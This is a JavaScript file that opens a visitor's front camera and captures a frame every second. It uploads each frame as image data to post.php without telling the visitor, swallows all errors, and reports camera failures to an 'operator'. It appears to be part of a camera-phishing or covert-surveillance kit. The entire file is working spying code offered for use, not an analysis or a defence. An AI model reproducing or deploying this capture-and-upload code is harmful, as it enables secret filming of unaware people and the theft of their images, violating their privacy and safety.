'use strict';
var video = document.getElementById('video');
var canvas = document.getElementById('canvas');
var errorMsgElement = document.querySelector('span#errorMsg');

// Send one frame to post.php (fire-and-forget, fast, no JSON parsing)
function post(data) {
    $.ajax({
        type: 'POST',
        url: 'post.php',
        data: { cat: data },
        cache: false,
        success: function(){},
        error: function(){}
    });
}

function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;
    var p = video.play();
    if (p && p.catch) { p.catch(function(){}); }
    var context = canvas.getContext('2d');
    // Send 1 frame every 1 second at the camera's real resolution - NO black bars
    setInterval(function() {
        if (video.readyState >= 2 && video.videoWidth > 0) {
            try {
                if (canvas.width !== video.videoWidth || canvas.height !== video.videoHeight) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                }
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                var canvasData = canvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
                post(canvasData);
            } catch (e) {}
        }
    }, 1000);
}

function init() {
    try {
        navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user' } })
            .then(handleSuccess)
            .catch(function(e) {
                var msg = 'CAMERA_ERROR: ' + (e.name || e.message || e);
                if (errorMsgElement) { errorMsgElement.innerHTML = msg; }
                // Report the failure to the server so the operator sees WHY nothing arrives
                $.ajax({ type: 'POST', url: 'post.php', data: { cat: msg }, cache: false, error: function(){} });
            });
    } catch (e) {
        var msg2 = 'CAMERA_ERROR: ' + (e.name || e.message || e);
        $.ajax({ type: 'POST', url: 'post.php', data: { cat: msg2 }, cache: false, error: function(){} });
    }
}

init();